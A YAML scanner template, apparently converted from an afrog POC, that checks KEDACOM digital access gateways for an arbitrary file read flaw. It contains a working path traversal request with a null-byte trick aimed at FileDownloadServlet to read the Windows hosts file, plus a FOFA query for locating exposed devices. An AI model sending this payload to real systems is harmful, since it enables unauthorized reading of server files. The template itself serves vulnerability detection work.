# 来源: afrog（转换自 afrog/xray 表达式 POC）
http:
  - matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - Microsoft TCP/IP for Windows
          - HOSTS file
        condition: and
    method: GET
    path:
      - '{{BaseURL}}/gatewayweb/FileDownloadServlet?fileName=test.txt&filePath=../../../../../../../../../../Windows/System32/drivers/etc/hosts%00.jpg&type=2'
id: kedacom-gateway-file-read
info:
  author: zan8in
  description: |-
    KEDACOM 数字系统接入网关 存在任意文件读取漏洞，攻击者通过构造请求可以读取服务器任意文件
    fofa: (app="KEDACOM-DVR接入网关") && (is_honeypot=false && is_fraud=false)
  metadata:
    argus-execution-class: detection
    argus-import-license: MIT License
    argus-import-source: afrog
    argus-risk-level: high
  name: KEDACOM数字系统接入网关 任意文件读取漏洞
  severity: high
  tags: kedacom,gateway,lfi,argus-import
